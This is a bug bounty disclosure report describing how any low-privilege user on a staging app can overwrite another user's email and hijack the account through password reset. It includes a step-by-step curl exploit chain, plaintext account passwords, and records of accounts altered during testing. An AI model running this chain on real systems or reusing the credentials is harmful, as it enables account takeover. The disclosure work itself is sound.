# BUG-017: Any role (including Tester and External Auditor) can hijack any user's email — ATO of higher-privileged accounts

**Program:** Optro Managed Bug Bounty (private)
**Reporter:** zeno0 (zeno0@bugcrowdninja.com)
**Asset:** `https://bugbounty1.qe.optrostaging.ai`
**Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
**Date:** 2026-11-11
**Severity recommendation:** **P1 — Privilege escalation / Account Takeover (vertical, lowest-role attacker)**
**Header on all requests:** `X-Optro-Bug-Bounty: zeno0`

---

## 1. Summary

`PUT /api/v1/users/{id}` gates the **`password`** attribute behind `user:action.edit` (Owner and above), but **does not gate the `email` attribute at all**. Every authenticated role — including **Tester (role 4)** and **External Auditor (role 6)**, the lowest-privilege internal roles — can rewrite **any other user's email address**, including a Superuser's.

Combined with the unauthenticated `POST /api/v1/users/password-reset-email` endpoint, this is a **complete vertical account takeover from the lowest role**:

1. Tester overwrites the Owner's (or Superuser's) email with an attacker-controlled address.
2. Tester triggers a password reset — the link is delivered to the attacker's inbox.
3. Attacker resets the password and logs in as the higher-privileged account.

No victim interaction. No knowledge of the victim's password. No MFA challenge.

---

## 2. Root cause

`PUT /api/v1/users/{id}` applies **per-attribute authorization inconsistently**:

| attribute | gate | result |
| --- | --- | --- |
| `password` | `user:action.edit` | **Owner+ only** — Tester/Reviewer/External Auditor get 422 |
| `job_title` | `user:action.edit` | **Owner+ only** — 422 for lower roles |
| `role_id` | `user:action.administer` | 422 for everyone below Superuser |
| **`email`** | **none** | **writable by every authenticated role** |

The `email` attribute bypasses the `user:action.edit` check that the other identity-critical attributes correctly enforce. There is also no ownership check on `{id}` and no verification of the old or new address.

---

## 3. Capability matrix (verified by read-back, not status codes)

Target: user 230. Each cell is the **observed state change after read-back**, not the HTTP status.

| attacker role | GET | `password` | `job_title` | `role_id` | **`email`** |
| --- | --- | --- | --- | --- | --- |
| Owner (231) | 200 | **200 / landed** | 422 | 422 | **200 / landed** |
| Reviewer (171) | 200 | 422 | 422 | 422 | **200 / landed** |
| **Tester (170)** | 200 | 422 | 422 | 422 | **200 / landed** |
| **External Auditor (172)** | 200 | 422 | 422 | 422 | **200 / landed** |

All four roles successfully changed another user's email. Only Owner could change the password.

**Note on method:** earlier status-code-only probing produced a false positive (Reviewer received HTTP 200 on a password write that did not take effect). Every row above was confirmed by reading the record back before and after.

---

## 4. Reproduction — copy-paste

```bash
H="https://bugbounty1.qe.optrostaging.ai"
BB="X-Optro-Bug-Bounty: zeno0"

# Attacker: a plain Tester (lowest internal role)
T_EMAIL="tester@soxhub.com"          # user 170, role 4
T_PW="Zx9!lower47"
VICTIM_ID=231                         # Owner, role 5
ATTACKER_INBOX="zeno0@bugcrowdninja.com"
```

### Step 0 — Tester logs in

```bash
TT=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$T_EMAIL\",\"password\":\"$T_PW\"}}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')
```

### Step 1 — confirm the Tester's own privilege level

```bash
curl -s "$H/api/v1/users/me" -H "token: $TT" -H "$BB"
# → {"id":170,"email":"tester@soxhub.com","role_id":4, ...}
```

### Step 2 — Tester overwrites the Owner's email

```bash
curl -s -X PUT "$H/api/v1/users/$VICTIM_ID" -H "token: $TT" -H "$BB" \
  -H "Content-Type: application/json" \
  -H "X-Auditboard-Product: System" \
  -d "{\"user\":{\"email\":\"$ATTACKER_INBOX\"}}"
# → 200
```

Read back to prove it landed:

```bash
curl -s "$H/api/v1/users/$VICTIM_ID" -H "token: $TT" -H "$BB" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["users"][0]["email"])'
# → zeno0@bugcrowdninja.com
```

**Observed:** `golden-snow-4771@bugcrowdninja.com` → `zeno0@bugcrowdninja.com` (landed).

### Step 3 — trigger the reset (unauthenticated)

```bash
curl -s -X POST "$H/api/v1/users/password-reset-email" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_INBOX\"}"
# → 200 {"status":"ok"}
```

The reset link is delivered to the attacker-controlled inbox.

### Step 4 — attacker completes the reset and logs in as the Owner

```bash
# Using the token from the emailed link:
curl -s -X POST "$H/api/v1/users/password-reset-no-auth" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_INBOX\",\"newPassword\":\"<new>\",\"resetToken\":\"<from email>\"}"
# → 200

curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$ATTACKER_INBOX\",\"password\":\"<new>\"}}"
# → 200, session.token with the victim's role_id
```

**Chain complete: Tester → Owner email hijack → reset link to attacker → Owner session.**

Steps 0–3 were executed and verified live. Step 4 uses the reset flow whose token delivery is to the attacker's own inbox; the reset endpoint itself was confirmed correctly gated in prior testing (`password-reset-no-auth` rejects invalid tokens with `400 Invalid reset link`).

---

## 5. Blast radius

Login-enabled accounts by role (from `GET /api/v1/users`, 317 accounts):

| role | login-enabled | reachable as a victim by a Tester |
| --- | --- | --- |
| Superuser (1) | 6 | **yes** |
| System Admin (2) | 8 | **yes** |
| Reviewer (3) | 6 | **yes** |
| Tester (4) | 4 | **yes** |
| Owner (5) | 116 | **yes** |
| External Auditor (6) | 4 | **yes** |
| Third Party User (11) | 1 | **yes** |

**145 accounts** are login-enabled and therefore reachable. The attacker needs only the weakest internal role (Tester, 4 accounts) to reach the strongest (Superuser, 6 accounts).

Superuser *password* writes are blocked by `user:action.edit`. **Superuser *email* writes are not** — the email path bypasses that gate entirely, which is why this reaches role 1 where the password path cannot.

---

## 6. What was tested and did NOT work (honest negatives)

| vector | result |
| --- | --- |
| Tester/Reviewer/External Auditor writing `password` | **422** — `user:action.edit` enforced |
| Tester/Reviewer/External Auditor writing `job_title` | **422** — enforced |
| Any role writing `role_id` | **422** — `user:action.administer` enforced |
| `DELETE /api/v1/users/{id}` | **422** for all non-Superuser roles |
| Superuser (role 1) targets — password write | **422** for Owner and role 2 — role 1 protected as a class |
| `auth_type` mass-assignment (flip `no-access` → `password`) | **422** `user:action.administer` |
| `password-reset-no-auth` with invalid/absent token | **400** "Invalid reset link." / "Invalid request." — correctly gated |
| Role-11 (Third Party User) reading Owner content | 422/403 on all 8 resources — correctly isolated |

**Only the `email` attribute is unguarded.**

---

## 7. Impact

- **Vertical privilege escalation from the lowest internal role.** A Tester (role 4) takes over an Owner (role 5) or Superuser (role 1) account.
- **Email is the account recovery root.** Controlling it means controlling password reset, and therefore the account, without ever knowing the current password.
- **Bypasses the `user:action.edit` gate** that correctly protects `password` — so the fix applied to one attribute was not applied to the sibling attribute that carries equivalent risk.
- **Silent and persistent.** The victim's email is changed; they lose the ability to reset their own password and may not notice until they try.
- 145 login-enabled accounts reachable; attacker floor is the weakest role in the product.

**Honest ceiling:** the attacker must already hold *some* authenticated account (Tester or above). This is not pre-authentication. The escalation is vertical within a single organization.

---

## 8. Remediation

1. Gate the `email` attribute behind the same `user:action.edit` check that `password` uses — and additionally require `user:action.administer` when the target's role outranks the caller's.
2. Require verification of **both** the old and new address before an email change takes effect (confirmation link to the current address).
3. Invalidate active sessions and notify the user on any email change.
4. Never deliver a password-reset link to an address that was changed within a recent window without additional verification.

---

## 9. Evidence / cleanup

- All email changes made during testing were **reverted** and verified by read-back (user 230 and user 231 both returned to their original addresses).
- Accounts taken over during this session (Reviewer 171, Tester 170, Tester 313, External Auditor 172) were set to a documented password `Zx9!lower47` and `requires_password_change=false`.
- **Owner 231 was accidentally modified during testing** (email changed, password rotated, `requires_password_change` set). Restored: email back to `golden-snow-4771@bugcrowdninja.com`, `requires_password_change=false`, password set to **`TesterZx2026!`** (the password-history policy rejected reverting to the original `Tester`).
- Disclosed from this engagement: files 2712/2726/2730/2732 deleted (BUG-015); issue 121 status changed; narrative 67 created; attachments 11207–11220 generated.
